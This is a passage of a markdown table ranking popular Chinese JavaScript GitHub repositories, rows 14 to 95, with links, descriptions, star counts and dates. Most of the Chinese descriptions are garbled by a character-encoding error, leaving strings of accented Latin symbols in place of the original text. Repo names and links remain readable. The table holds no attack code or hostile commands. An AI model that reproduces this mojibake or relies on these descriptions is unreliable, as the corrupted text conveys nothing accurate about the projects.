|14|[alsotang/node-lessons](https://github.com/alsotang/node-lessons)|:closed_book:„ÄäNode.js ÂåÖÊïô‰∏çÂåÖ‰ºö„Äã by alsotang|16.0k|JavaScript|06/10|
|15|[alibaba/ice](https://github.com/alibaba/ice)|üöÄ  Simple and friendly front-end development systemÔºàÈ£ûÂÜ∞ÔºåÁÆÄÂçïËÄåÂèãÂ•ΩÁöÑÂâçÁ´ØÁ†îÂèë‰ΩìÁ≥ª Ôºâhttps://ice.work/|15.8k|JavaScript|10/29|
|16|[chaozh/awesome-blockchain-cn](https://github.com/chaozh/awesome-blockchain-cn)|Êî∂ÈõÜÊâÄÊúâÂå∫ÂùóÈìæ(BlockChain)ÊäÄÊúØÂºÄÂèëÁõ∏ÂÖ≥ËµÑÊñôÔºåÂåÖÊã¨FabricÂíåEthereumÂºÄÂèëËµÑÊñô|15.1k|JavaScript|05/29|
|17|[haizlin/fe-interview](https://github.com/haizlin/fe-interview)|ÂâçÁ´ØÈù¢ËØïÊØèÊó• 3+1Ôºå‰ª•Èù¢ËØïÈ¢òÊù•È©±Âä®Â≠¶‰π†ÔºåÊèêÂÄ°ÊØèÊó•Â≠¶‰π†‰∏éÊÄùËÄÉÔºåÊØèÂ§©ËøõÊ≠•‰∏ÄÁÇπÔºÅÊØèÂ§©Êó©‰∏ä5ÁÇπÁ∫ØÊâãÂ∑•ÂèëÂ∏ÉÈù¢ËØïÈ¢òÔºàÊ≠ªÁ£ïËá™Â∑±ÔºåÊÑâÊÇ¶Â§ßÂÆ∂ÔºâÔºå3000+ÈÅìÂâçÁ´ØÈù¢ËØïÈ¢òÂÖ®Èù¢Ë¶ÜÁõñÔºåHTML/CSS/JavaScript/Vue/React/Nodejs/TypeScript/ECMAScritpt/Webpack/Jquery/Â∞èÁ®ãÂ∫è/ËΩØÊäÄËÉΩ‚Ä¶‚Ä¶|14.0k|JavaScript|10/30|
|18|[youzan/vant-weapp](https://github.com/youzan/vant-weapp)|ËΩªÈáè„ÄÅÂèØÈù†ÁöÑÂ∞èÁ®ãÂ∫è UI ÁªÑ‰ª∂Â∫ì|13.7k|JavaScript|10/15|
|19|[EastWorld/wechat-app-mall](https://github.com/EastWorld/wechat-app-mall)|ÂæÆ‰ø°Â∞èÁ®ãÂ∫èÂïÜÂüéÔºåÂæÆ‰ø°Â∞èÁ®ãÂ∫èÂæÆÂ∫ó|13.4k|JavaScript|10/24|
|20|[qianguyihao/Web](https://github.com/qianguyihao/Web)|ÂâçÁ´ØÂÖ•Èó®Âà∞ËøõÈò∂ÂõæÊñáÊïôÁ®ãÔºåË∂ÖËØ¶ÁªÜÁöÑWebÂâçÁ´ØÂ≠¶‰π†Á¨îËÆ∞„ÄÇ‰ªéÈõ∂ÂºÄÂßãÂ≠¶ÂâçÁ´ØÔºåÂÅö‰∏ÄÂêçÁ≤æËá¥‰ºòÈõÖÁöÑÂâçÁ´ØÂ∑•Á®ãÂ∏à„ÄÇÂÖ¨‰ºóÂè∑„ÄåÂçÉÂè§Â£πÂè∑„Äç‰ΩúËÄÖ„ÄÇ|13.1k|JavaScript|10/23|
|21|[dcloudio/mui](https://github.com/dcloudio/mui)|ÊúÄÊé•ËøëÂéüÁîüAPP‰ΩìÈ™åÁöÑÈ´òÊÄßËÉΩÊ°ÜÊû∂|13.0k|JavaScript|07/30|
|22|[ryanhanwu/How-To-Ask-Questions-The-Smart-Way](https://github.com/ryanhanwu/How-To-Ask-Questions-The-Smart-Way)|Êú¨ÊñáÂéüÊñáÁî±Áü•Âêç Hacker Eric S. Raymond ÊâÄÊí∞ÂØ´ÔºåÊïô‰Ω†Â¶Ç‰ΩïÊ≠£Á¢∫ÁöÑÊèêÂá∫ÊäÄË°ìÂïèÈ°å‰∏¶Áç≤Âæó‰Ω†ÊªøÊÑèÁöÑÁ≠îÊ°à„ÄÇ|12.9k|JavaScript|10/25|
|23|[phobal/ivideo](https://github.com/phobal/ivideo)|‰∏Ä‰∏™ÂèØ‰ª•ËßÇÁúãÂõΩÂÜÖ‰∏ªÊµÅËßÜÈ¢ëÂπ≥Âè∞ÊâÄÊúâËßÜÈ¢ëÁöÑÂÆ¢Êà∑Á´ØÔºàMac„ÄÅWindows„ÄÅLinuxÔºâ A client that can watch video of domestic(China) mainstream video platform|11.7k|JavaScript|09/04|
|24|[Tencent/omi](https://github.com/Tencent/omi)| Front End Cross-Frameworks Framework - ÂâçÁ´ØË∑®Ê°ÜÊû∂Ë∑®Âπ≥Âè∞Ê°ÜÊû∂|11.4k|JavaScript|09/30|
|25|[amfe/lib-flexible](https://github.com/amfe/lib-flexible)|ÂèØ‰º∏Áº©Â∏ÉÂ±ÄÊñπÊ°à|11.1k|JavaScript|06/19|
|26|[bailicangdu/node-elm](https://github.com/bailicangdu/node-elm)|Âü∫‰∫é node.js + Mongodb ÊûÑÂª∫ÁöÑÂêéÂè∞Á≥ªÁªü|10.3k|JavaScript|09/11|
|27|[answershuto/learnVue](https://github.com/answershuto/learnVue)|:octocat:Vue.js Ê∫êÁ†ÅËß£Êûê|10.0k|JavaScript|10/19|
|28|[xiandanin/magnetW](https://github.com/xiandanin/magnetW)|Á£ÅÂäõÈìæÊé•ËÅöÂêàÊêúÁ¥¢|9.5k|JavaScript|07/23|
|29|[modood/Administrative-divisions-of-China](https://github.com/modood/Administrative-divisions-of-China)|‰∏≠Âçé‰∫∫Ê∞ëÂÖ±ÂíåÂõΩË°åÊîøÂå∫ÂàíÔºöÁúÅÁ∫ßÔºàÁúÅ‰ªΩÁõ¥ËæñÂ∏ÇËá™Ê≤ªÂå∫Ôºâ„ÄÅ Âú∞Á∫ßÔºàÂüéÂ∏ÇÔºâ„ÄÅ ÂéøÁ∫ßÔºàÂå∫ÂéøÔºâ„ÄÅ ‰π°Á∫ßÔºà‰π°ÈïáË°óÈÅìÔºâ„ÄÅ ÊùëÁ∫ßÔºàÊùëÂßî‰ºöÂ±ÖÂßî‰ºöÔºâ Ôºå‰∏≠ÂõΩÁúÅÂ∏ÇÂå∫ÈïáÊùë‰∫åÁ∫ß‰∏âÁ∫ßÂõõÁ∫ß‰∫îÁ∫ßËÅîÂä®Âú∞ÂùÄÊï∞ÊçÆ„ÄÇ|9.1k|JavaScript|07/30|
|30|[cnodejs/nodeclub](https://github.com/cnodejs/nodeclub)|:baby_chick:Nodeclub ÊòØ‰ΩøÁî® Node.js Âíå MongoDB ÂºÄÂèëÁöÑÁ§æÂå∫Á≥ªÁªü|8.9k|JavaScript|09/23|
|31|[bailicangdu/vue2-happyfri](https://github.com/bailicangdu/vue2-happyfri)|vue2 + vue-router + vuex  ÂÖ•Èó®È°πÁõÆ|8.4k|JavaScript|08/11|
|32|[trazyn/ieaseMusic](https://github.com/trazyn/ieaseMusic)|ÁΩëÊòì‰∫ëÈü≥‰πêÁ¨¨‰∏âÊñπ|8.3k|JavaScript|07/07|
|33|[zhaoolee/ChineseBQB](https://github.com/zhaoolee/ChineseBQB)|üá®üá≥ Chinese sticker pack,More joy / Ë°®ÊÉÖÂåÖÁöÑÂçöÁâ©È¶Ü, GithubÊúÄÊúâÊØíÁöÑ‰ªìÂ∫ì, ‰∏≠ÂõΩË°®ÊÉÖÂåÖÂ§ßÈõÜÂêà, ËÅöÊ¨¢‰πê~|8.2k|JavaScript|10/12|
|34|[star7th/showdoc](https://github.com/star7th/showdoc)|ShowDoc is a tool greatly applicable for an IT team to share documents online‰∏Ä‰∏™ÈùûÂ∏∏ÈÄÇÂêàITÂõ¢ÈòüÁöÑÂú®Á∫øAPIÊñáÊ°£„ÄÅÊäÄÊúØÊñáÊ°£Â∑•ÂÖ∑|8.0k|JavaScript|10/24|
|35|[didi/chameleon](https://github.com/didi/chameleon)|ü¶é ‰∏ÄÂ•ó‰ª£Á†ÅËøêË°åÂ§öÁ´ØÔºå‰∏ÄÁ´ØÊâÄËßÅÂç≥Â§öÁ´ØÊâÄËßÅ|7.9k|JavaScript|09/21|
|36|[haotian-wang/google-access-helper](https://github.com/haotian-wang/google-access-helper)|Ë∞∑Ê≠åËÆøÈóÆÂä©ÊâãÁ†¥Ëß£Áâà|7.6k|JavaScript|04/04|
|37|[evil-huawei/evil-huawei](https://github.com/evil-huawei/evil-huawei)|Evil Huawei - Âçé‰∏∫‰ΩúËøáÁöÑÊÅ∂|7.6k|JavaScript|08/03|
|38|[thinkgem/jeesite](https://github.com/thinkgem/jeesite)|JeeSite ÊòØ‰∏Ä‰∏™‰ºÅ‰∏ö‰ø°ÊÅØÂåñÂºÄÂèëÂü∫Á°ÄÂπ≥Âè∞ÔºåJava‰ºÅ‰∏öÂ∫îÁî®ÂºÄÊ∫êÊ°ÜÊû∂ÔºåJava EEÔºàJ2EEÔºâÂø´ÈÄüÂºÄÂèëÊ°ÜÊû∂Ôºå‰ΩøÁî®ÁªèÂÖ∏ÊäÄÊúØÁªÑÂêàÔºàSpring„ÄÅSpring MVC„ÄÅApache Shiro„ÄÅMyBatis„ÄÅBootstrap UIÔºâÔºåÂåÖÊã¨Ê†∏ÂøÉÊ®°ÂùóÂ¶ÇÔºöÁªÑÁªáÊú∫ÊûÑ„ÄÅËßíËâ≤Áî®Êà∑„ÄÅÊùÉÈôêÊéàÊùÉ„ÄÅÊï∞ÊçÆÊùÉÈôê„ÄÅÂÜÖÂÆπÁÆ°ÁêÜ„ÄÅÂ∑•‰ΩúÊµÅÁ≠â„ÄÇ|7.5k|JavaScript|10/08|
|39|[icindy/wxParse](https://github.com/icindy/wxParse)|wxParse-ÂæÆ‰ø°Â∞èÁ®ãÂ∫èÂØåÊñáÊú¨Ëß£ÊûêËá™ÂÆö‰πâÁªÑ‰ª∂ÔºåÊîØÊåÅHTMLÂèämarkdownËß£Êûê|7.5k|JavaScript|03/19|
|40|[eip-work/kuboard-press](https://github.com/eip-work/kuboard-press)|Kuboard ÊòØÂü∫‰∫é Kubernetes ÁöÑÂæÆÊúçÂä°ÁÆ°ÁêÜÁïåÈù¢„ÄÇÂêåÊó∂Êèê‰æõ Kubernetes ÂÖçË¥π‰∏≠ÊñáÊïôÁ®ãÔºåÂÖ•Èó®ÊïôÁ®ãÔºåÊúÄÊñ∞ÁâàÊú¨ÁöÑ Kubernetes v1.18 ÂÆâË£ÖÊâãÂÜåÔºå(k8s install) Âú®Á∫øÁ≠îÁñëÔºåÊåÅÁª≠Êõ¥Êñ∞„ÄÇ|7.1k|JavaScript|10/29|
|41|[bailicangdu/react-pxq](https://github.com/bailicangdu/react-pxq)|‰∏Ä‰∏™ react + redux ÁöÑÂÆåÊï¥È°πÁõÆ Âíå ‰∏™‰∫∫ÊÄªÁªì|6.9k|JavaScript|08/11|
|42|[1c7/Crash-Course-Computer-Science-Chinese](https://github.com/1c7/Crash-Course-Computer-Science-Chinese)|:computer: ËÆ°ÁÆóÊú∫ÈÄüÊàêËØæ   Crash Course Â≠óÂπïÁªÑ (ÂÖ®40ÈõÜ 2018-5-1 Á≤æÊ†°ÂÆåÊàê)|6.1k|JavaScript|07/02|
|43|[ElemeFE/v-charts](https://github.com/ElemeFE/v-charts)|Âü∫‰∫é Vue2.0 Âíå ECharts Â∞ÅË£ÖÁöÑÂõæË°®ÁªÑ‰ª∂üìàüìä|6.1k|JavaScript|08/26|
|44|[chokcoco/CSS-Inspiration](https://github.com/chokcoco/CSS-Inspiration)|CSS InspirationÔºåÂú®ËøôÈáåÊâæÂà∞ÂÜô CSS ÁöÑÁÅµÊÑüÔºÅ|5.8k|JavaScript|08/26|
|45|[ljianshu/Blog](https://github.com/ljianshu/Blog)|ÂÖ≥Ê≥®Âü∫Á°ÄÁü•ËØÜÔºåÊâìÈÄ†‰ºòË¥®ÂâçÁ´ØÂçöÂÆ¢ÔºåÂÖ¨‰ºóÂè∑[ÂâçÁ´ØÂ∑•Âå†]ÁöÑ‰ΩúËÄÖ|5.8k|JavaScript|09/11|
|46|[hotoo/pinyin](https://github.com/hotoo/pinyin)|:cn: Ê±âÂ≠óÊãºÈü≥ ‚ûú h√†n z√¨ pƒ´n yƒ´n|5.4k|JavaScript|09/29|
|47|[ustbhuangyi/vue-analysis](https://github.com/ustbhuangyi/vue-analysis)|:thumbsup: Vue.js Ê∫êÁ†ÅÂàÜÊûê|5.4k|JavaScript|09/11|
|48|[fex-team/ueditor](https://github.com/fex-team/ueditor)|rich text ÂØåÊñáÊú¨ÁºñËæëÂô®|5.4k|JavaScript|09/27|
|49|[timqian/chinese-independent-blogs](https://github.com/timqian/chinese-independent-blogs)|‰∏≠ÊñáÁã¨Á´ãÂçöÂÆ¢ÂàóË°®|5.3k|JavaScript|10/29|
|50|[wuchangming/spy-debugger](https://github.com/wuchangming/spy-debugger)|ÂæÆ‰ø°Ë∞ÉËØïÔºåÂêÑÁßçWebViewÊ†∑ÂºèË∞ÉËØï„ÄÅÊâãÊú∫ÊµèËßàÂô®ÁöÑÈ°µÈù¢ÁúüÊú∫Ë∞ÉËØï„ÄÇ‰æøÊç∑ÁöÑËøúÁ®ãË∞ÉËØïÊâãÊú∫È°µÈù¢„ÄÅÊäìÂåÖÂ∑•ÂÖ∑ÔºåÊîØÊåÅÔºöHTTP/HTTPSÔºåÊó†ÈúÄUSBËøûÊé•ËÆæÂ§á„ÄÇ|5.3k|JavaScript|07/17|
|51|[HcySunYang/vue-design](https://github.com/HcySunYang/vue-design)|üìñ masterÂàÜÊîØÔºö„ÄäÊ∏≤ÊüìÂô®„Äã elegantÂàÜÊîØÔºöÈÄêË°åÁ∫ßÂà´ÁöÑÊ∫êÁ†ÅÂàÜÊûê|5.1k|JavaScript|09/25|
|52|[ix64/unlock-music](https://github.com/ix64/unlock-music)|Unlock encrypted music file in browser. Âú®ÊµèËßàÂô®‰∏≠Ëß£ÈîÅÂä†ÂØÜÁöÑÈü≥‰πêÊñá‰ª∂„ÄÇ|5.0k|JavaScript|10/20|
|53|[sxei/chrome-plugin-demo](https://github.com/sxei/chrome-plugin-demo)|„ÄäChromeÊèí‰ª∂ÂºÄÂèëÂÖ®ÊîªÁï•„ÄãÈÖçÂ•óÂÆåÊï¥DemoÔºåÊ¨¢Ëøéclone‰ΩìÈ™å|4.9k|JavaScript|06/18|
|54|[openspug/spug](https://github.com/openspug/spug)|ÂºÄÊ∫êËøêÁª¥Âπ≥Âè∞ÔºöÈù¢Âêë‰∏≠Â∞èÂûã‰ºÅ‰∏öËÆæËÆ°ÁöÑËΩªÈáèÁ∫ßÊó†AgentÁöÑËá™Âä®ÂåñËøêÁª¥Âπ≥Âè∞ÔºåÊï¥Âêà‰∫Ü‰∏ªÊú∫ÁÆ°ÁêÜ„ÄÅ‰∏ªÊú∫ÊâπÈáèÊâßË°å„ÄÅ‰∏ªÊú∫Âú®Á∫øÁªàÁ´Ø„ÄÅÊñá‰ª∂Âú®Á∫ø‰∏ä‰º†‰∏ãËΩΩ„ÄÅÂ∫îÁî®ÂèëÂ∏ÉÈÉ®ÁΩ≤„ÄÅÂú®Á∫ø‰ªªÂä°ËÆ°Âàí„ÄÅÈÖçÁΩÆ‰∏≠ÂøÉ„ÄÅÁõëÊéß„ÄÅÊä•Ë≠¶Á≠â‰∏ÄÁ≥ªÂàóÂäüËÉΩ„ÄÇ|4.8k|JavaScript|10/28|
|55|[ecomfe/echarts-for-weixin](https://github.com/ecomfe/echarts-for-weixin)|Apache ECharts (incubating) ÁöÑÂæÆ‰ø°Â∞èÁ®ãÂ∫èÁâàÊú¨|4.6k|JavaScript|09/11|
|56|[AutoPiano/AutoPiano](https://github.com/AutoPiano/AutoPiano)|Ëá™Áî±Èí¢Áê¥ üéπ AutoPiano ( https://www.autopiano.cn )   Simple & Elegant Piano Online|4.5k|JavaScript|09/09|
|57|[wux-weapp/wux-weapp](https://github.com/wux-weapp/wux-weapp)|:dog: ‰∏ÄÂ•óÁªÑ‰ª∂Âåñ„ÄÅÂèØÂ§çÁî®„ÄÅÊòìÊâ©Â±ïÁöÑÂæÆ‰ø°Â∞èÁ®ãÂ∫è UI ÁªÑ‰ª∂Â∫ì|4.5k|JavaScript|09/15|
|58|[Jannchie/Historical-ranking-data-visualization-based-on-d3.js](https://github.com/Jannchie/Historical-ranking-data-visualization-based-on-d3.js)|ËøôÊòØ‰∏Ä‰∏™Êï∞ÊçÆÂèØËßÜÂåñÈ°πÁõÆÔºåËÉΩÂ§üÂ∞ÜÂéÜÂè≤Êï∞ÊçÆÊéíÂêçËΩ¨Âåñ‰∏∫Âä®ÊÄÅÊü±Áä∂ÂõæÂõæË°®|4.5k|JavaScript|10/07|
|59|[xiaolin3303/wx-charts](https://github.com/xiaolin3303/wx-charts)|ÂæÆ‰ø°Â∞èÁ®ãÂ∫èÂõæË°®chartsÁªÑ‰ª∂ÔºåCharts for WeChat small app|4.3k|JavaScript|06/10|
|60|[wechat-miniprogram/miniprogram-demo](https://github.com/wechat-miniprogram/miniprogram-demo)|ÂæÆ‰ø°Â∞èÁ®ãÂ∫èÁªÑ‰ª∂ / API / ‰∫ëÂºÄÂèëÁ§∫‰æã|4.3k|JavaScript|10/29|
|61|[the1812/Bilibili-Evolved](https://github.com/the1812/Bilibili-Evolved)|Âº∫Â§ßÁöÑÂìîÂì©ÂìîÂì©Â¢ûÂº∫ËÑöÊú¨: ‰∏ãËΩΩËßÜÈ¢ë, Èü≥‰πê, Â∞ÅÈù¢, ÂºπÂπï / ÁÆÄÂåñÁõ¥Êí≠Èó¥, ËØÑËÆ∫Âå∫, È¶ñÈ°µ / Ëá™ÂÆö‰πâÈ°∂Ê†è, Âà†Èô§ÂπøÂëä, Â§úÈó¥Ê®°Âºè / Ëß¶Â±èËÆæÂ§áÊîØÊåÅ|4.2k|JavaScript|10/30|
|62|[SaekiRaku/vscode-rainbow-fart](https://github.com/SaekiRaku/vscode-rainbow-fart)|‰∏Ä‰∏™Âú®‰Ω†ÁºñÁ®ãÊó∂ÁñØÁãÇÁß∞Ëµû‰Ω†ÁöÑ VSCode Êâ©Â±ïÊèí‰ª∂   An VSCode extension that keeps giving you compliment while you are coding, it will checks the keywords of code to play suitable sounds.|4.2k|JavaScript|07/21|
|63|[Kenshin/simpread](https://github.com/Kenshin/simpread)|ÁÆÄÊÇ¶ ( SimpRead ) - ËÆ©‰Ω†Áû¨Èó¥ËøõÂÖ•Ê≤âÊµ∏ÂºèÈòÖËØªÁöÑÊâ©Â±ï|4.1k|JavaScript|10/21|
|64|[duxianwei520/react](https://github.com/duxianwei520/react)| React+webpack+redux+ant design+axios+lessÂÖ®ÂÆ∂Ê°∂ÂêéÂè∞ÁÆ°ÁêÜÊ°ÜÊû∂|3.9k|JavaScript|09/05|
|65|[lessfish/underscore-analysis](https://github.com/lessfish/underscore-analysis)|„ÄêNO LONGER UPDATE„Äëunderscore-1.8.3.js Ê∫êÁ†ÅËß£ËØª & Á≥ªÂàóÊñáÁ´†ÔºàÂÆåÔºâ|3.8k|JavaScript|03/05|
|66|[kdchang/reactjs101](https://github.com/kdchang/reactjs101)|ÂæûÈõ∂ÈñãÂßãÂ≠∏ ReactJSÔºàReactJS 101ÔºâÊòØ‰∏ÄÊú¨Â∏åÊúõËÆìÂàùÂ≠∏ËÄÖ‰∏ÄÁúãÂ∞±ÊáÇÁöÑ React ‰∏≠ÊñáÂÖ•ÈñÄÊïôÂ≠∏Êõ∏ÔºåÁî±Ê∑∫ÂÖ•Ê∑±Â≠∏Áøí ReactJS ÁîüÊÖãÁ≥ª (Flux, Redux, React Router, ImmutableJS, React Native, Relay/GraphQL etc.)„ÄÇ|3.8k|JavaScript|09/08|
|67|[margox/braft-editor](https://github.com/margox/braft-editor)|ÁæéËßÇÊòìÁî®ÁöÑReactÂØåÊñáÊú¨ÁºñËæëÂô®ÔºåÂü∫‰∫édraft-jsÂºÄÂèë|3.6k|JavaScript|10/06|
|68|[Tencent/westore](https://github.com/Tencent/westore)|ÂæÆ‰ø°Â∞èÁ®ãÂ∫èËß£ÂÜ≥ÊñπÊ°à - 1KB javascript Ë¶ÜÁõñÁä∂ÊÄÅÁÆ°ÁêÜ„ÄÅË∑®È°µÈÄöËÆØ„ÄÅÊèí‰ª∂ÂºÄÂèëÂíå‰∫ëÊï∞ÊçÆÂ∫ìÂºÄÂèë|3.6k|JavaScript|04/25|
|69|[Tencent/kbone](https://github.com/Tencent/kbone)|‰∏Ä‰∏™Ëá¥Âäõ‰∫éÂæÆ‰ø°Â∞èÁ®ãÂ∫èÂíå Web Á´ØÂêåÊûÑÁöÑËß£ÂÜ≥ÊñπÊ°à|3.6k|JavaScript|10/22|
|70|[any86/any-rule](https://github.com/any86/any-rule)|ü¶ï  Â∏∏Áî®Ê≠£ÂàôÂ§ßÂÖ®, ÊîØÊåÅweb / vscode / idea / Alfred WorkflowÂ§öÂπ≥Âè∞|3.5k|JavaScript|10/20|
|71|[gxtrobot/bustag](https://github.com/gxtrobot/bustag)|a tag and recommend system for old bus driver ÁªôËÄÅÂè∏Êú∫Áî®ÁöÑ‰∏Ä‰∏™Áï™Âè∑Êé®ËçêÁ≥ªÁªü|3.5k|JavaScript|03/31|
|72|[huangjianke/Gitter](https://github.com/huangjianke/Gitter)|Gitter for GitHub - ÂèØËÉΩÊòØÁõÆÂâçÈ¢úÂÄºÊúÄÈ´òÁöÑGitHubÂæÆ‰ø°Â∞èÁ®ãÂ∫èÂÆ¢Êà∑Á´Ø|3.4k|JavaScript|10/21|
|73|[remaxjs/remax](https://github.com/remaxjs/remax)|‰ΩøÁî®ÁúüÊ≠£ÁöÑ React ÊûÑÂª∫Ë∑®Âπ≥Âè∞Â∞èÁ®ãÂ∫è|3.3k|JavaScript|10/28|
|74|[alibaba/f2etest](https://github.com/alibaba/f2etest)|F2etestÊòØ‰∏Ä‰∏™Èù¢ÂêëÂâçÁ´Ø„ÄÅÊµãËØï„ÄÅ‰∫ßÂìÅÁ≠âÂ≤ó‰ΩçÁöÑÂ§öÊµèËßàÂô®ÂÖºÂÆπÊÄßÊµãËØïÊï¥‰ΩìËß£ÂÜ≥ÊñπÊ°à„ÄÇ|3.2k|JavaScript|10/13|
|75|[zxlie/FeHelper](https://github.com/zxlie/FeHelper)|üòçFeHelper--WebÂâçÁ´ØÂä©ÊâãÔºàAwesomeÔºÅChrome & Firefox & MS-Edge Extension, All in one Toolbox!Ôºâ|3.2k|JavaScript|10/29|
|76|[bilibili-helper/bilibili-helper-o](https://github.com/bilibili-helper/bilibili-helper-o)|ÂìîÂì©ÂìîÂì© (bilibili.com) ËæÖÂä©Â∑•ÂÖ∑ÔºåÂèØ‰ª•ÊõøÊç¢Êí≠ÊîæÂô®„ÄÅÊé®ÈÄÅÈÄöÁü•Âπ∂ËøõË°å‰∏Ä‰∫õÂø´Êç∑Êìç‰Ωú|3.2k|JavaScript|10/30|
|77|[berwin/Blog](https://github.com/berwin/Blog)|ËÆ∞ÂΩïÊàêÈïøÁöÑËøáÁ®ã|3.1k|JavaScript|06/10|
|78|[aui/artDialog](https://github.com/aui/artDialog)|ÁªèÂÖ∏ÁöÑÁΩëÈ°µÂØπËØùÊ°ÜÁªÑ‰ª∂|3.1k|JavaScript|08/05|
|79|[dyq086/wepy-mall](https://github.com/dyq086/wepy-mall)|ÂæÆ‰ø°Â∞èÁ®ãÂ∫è--Âü∫‰∫éwepy ÂïÜÂüé(ÂæÆÂ∫ó)ÂæÆ‰ø°Â∞èÁ®ãÂ∫è Ê¨¢ËøéÂ≠¶‰π†‰∫§ÊµÅ|3.1k|JavaScript|05/13|
|80|[wandergis/coordtransform](https://github.com/wandergis/coordtransform)|Êèê‰æõ‰∫ÜÁôæÂ∫¶ÂùêÊ†áÔºàBD09Ôºâ„ÄÅÂõΩÊµãÂ±ÄÂùêÊ†áÔºàÁÅ´ÊòüÂùêÊ†áÔºåGCJ02Ôºâ„ÄÅÂíåWGS84ÂùêÊ†áÁ≥ª‰πãÈó¥ÁöÑËΩ¨Êç¢|3.0k|JavaScript|06/06|
|81|[ly525/luban-h5](https://github.com/ly525/luban-h5)|[WIP]en: web design tool    mobile page builder/editor    mini webflow for mobile page. zh: Á±ª‰ººÊòì‰ºÅÁßÄÁöÑH5Âà∂‰Ωú„ÄÅÂª∫Á´ôÂ∑•ÂÖ∑„ÄÅÂèØËßÜÂåñÊê≠Âª∫Á≥ªÁªü.|3.0k|JavaScript|10/30|
|82|[think2011/localResizeIMG](https://github.com/think2011/localResizeIMG)|üî• ÂâçÁ´ØÊú¨Âú∞ÂÆ¢Êà∑Á´ØÂéãÁº©ÂõæÁâáÔºåÂÖºÂÆπIOSÔºåAndroidÔºåPC„ÄÅËá™Âä®ÊåâÈúÄÂä†ËΩΩÊñá‰ª∂ |3.0k|JavaScript|10/15|
|83|[langren1353/GM_script](https://github.com/langren1353/GM_script)|ÊàëÂ∞±ÊòØÊù•ÂàÜ‰∫´ËÑöÊú¨Áé©Áé©ÁöÑ|2.9k|JavaScript|10/21|
|84|[hustcc/echarts-for-react](https://github.com/hustcc/echarts-for-react)|:chart_with_upwards_trend: Apache ECharts (incubating) components for React wrapper. ‰∏Ä‰∏™ÁÆÄÂçïÁöÑ Apache echarts (incubating) ÁöÑ React Â∞ÅË£Ö„ÄÇ|2.8k|JavaScript|09/06|
|85|[doramart/DoraCMS](https://github.com/doramart/DoraCMS)|DoraCMSÊòØÂü∫‰∫éNodejs+eggjs+mongodbÁºñÂÜôÁöÑ‰∏ÄÂ•óÂÜÖÂÆπÁÆ°ÁêÜÁ≥ªÁªüÔºåÁªìÊûÑÁÆÄÂçïÔºåËæÉÁõÆÂâç‰∏Ä‰∫õÂºÄÊ∫êÁöÑcmsÔºådoracmsÊòì‰∫éÊãìÂ±ïÔºåÁâπÂà´ÈÄÇÂêàÂâçÁ´ØÂºÄÂèëÂ∑•Á®ãÂ∏àÂÅö‰∫åÊ¨°ÂºÄÂèë„ÄÇ|2.8k|JavaScript|10/24|
|86|[crmeb/CRMEB](https://github.com/crmeb/CRMEB)|ÂºÄÊ∫êÂæÆ‰ø°ÂÖ¨‰ºóÂè∑ÂïÜÂüé Â∞èÁ®ãÂ∫èÂïÜÂüéÁ≥ªÁªüÔºåÂ∏¶ÂàÜÈîÄ„ÄÅÊãºÂõ¢„ÄÅÁßíÊùÄ„ÄÅÁ†ç‰ª∑„ÄÅ‰ºòÊÉ†Âà∏„ÄÅÁßØÂàÜÁ≠âÂäüËÉΩÔºåÂâçÂêéÁ´ØÂÖ®ÈÉ®ÂºÄÊ∫êÔºåÊõ¥ÊòØ‰∏ÄÂ•óÊñπ‰æø‰∫åÊ¨°ÂºÄÂèëÁöÑÊ°ÜÊû∂|2.8k|JavaScript|10/29|
|87|[cteamx/Thief](https://github.com/cteamx/Thief)|‰∏ÄÊ¨æÂàõÊñ∞Ë∑®Âπ≥Âè∞Êë∏È±ºÁ•ûÂô®ÔºåÊîØÊåÅÂ∞èËØ¥„ÄÅËÇ°Á•®„ÄÅÁΩëÈ°µ„ÄÅËßÜÈ¢ë„ÄÅÁõ¥Êí≠„ÄÅPDF„ÄÅÊ∏∏ÊàèÁ≠âÊë∏È±ºÊ®°ÂºèÔºå‰∏∫‰∏äÁè≠ÊóèÊâìÈÄ†ÁöÑ‰∏äÁè≠ÂøÖÂ§áÁ•ûÂô®Ôºå‰ΩøÁî®Ê≠§ËΩØ‰ª∂ÂèØ‰ª•ËÆ©‰∏äÁè≠ÂÄçÊÑüËΩªÊùæÔºåËøúÁ¶ª ICU„ÄÇ|2.8k|JavaScript|05/05|
|88|[iammapping/wedding](https://github.com/iammapping/wedding)|Â©öÁ§ºÂ§ßÂ±è‰∫íÂä®ÔºåÂæÆ‰ø°ËØ∑Êü¨‰∏ÄÁ´ôÂºèËß£ÂÜ≥ÊñπÊ°à|2.8k|JavaScript|07/16|
|89|[Ice-Hazymoon/MikuTools](https://github.com/Ice-Hazymoon/MikuTools)|‰∏Ä‰∏™ËΩªÈáèÁöÑÂ∑•ÂÖ∑ÈõÜÂêà|2.8k|JavaScript|07/20|
|90|[AlloyTeam/PhyTouch](https://github.com/AlloyTeam/PhyTouch)|Smooth scrolling, rotation, pull to refresh, page transition and any motion for the web - ‰∏ùËà¨È°∫ÊªëÁöÑËß¶Êë∏ËøêÂä®ÊñπÊ°à|2.8k|JavaScript|06/22|
|91|[sx1989827/DOClever](https://github.com/sx1989827/DOClever)|ÂÅöÊúÄÂ•ΩÁöÑÊé•Âè£ÁÆ°ÁêÜÂπ≥Âè∞|2.7k|JavaScript|09/04|
|92|[sunoj/jjb](https://github.com/sunoj/jjb)|‰∫¨‰ª∑‰øùÔºà‰∫¨‰ª∑ÂÆùÔºâ‚Äî‚Äî ‰∏Ä‰∏™Â∏ÆÂä©‰Ω†Ëá™Âä®Áî≥ËØ∑‰∫¨‰∏ú‰ª∑Ê†º‰øùÊä§ÁöÑchromeÊãìÂ±ï|2.7k|JavaScript|10/28|
|93|[x-extends/vxe-table](https://github.com/x-extends/vxe-table)|üê¨ vxe-table vue  Ë°®Ê†ºËß£ÂÜ≥ÊñπÊ°à|2.6k|JavaScript|10/27|
|94|[shen100/mili](https://github.com/shen100/mili)|mili ÊòØ‰∏Ä‰∏™ÂºÄÊ∫êÁöÑÁ§æÂå∫Á≥ªÁªüÔºåÁïåÈù¢‰ºòÈõÖÔºåÂäüËÉΩ‰∏∞ÂØåüòõ|2.6k|JavaScript|09/05|
|95|[qq281113270/vue](https://github.com/qq281113270/vue)|vueÊ∫êÁ†ÅÈÄêË°åÊ≥®ÈáäÂàÜÊûê+40Â§ömÁöÑvueÊ∫êÁ†ÅÁ®ãÂ∫èÊµÅÁ®ãÂõæÊÄùÁª¥ÂØºÂõæ ÔºàdiffÈÉ®ÂàÜÂæÖÂêéÁª≠Êõ¥Êñ∞Ôºâ|2.6k|JavaScript|07/15|
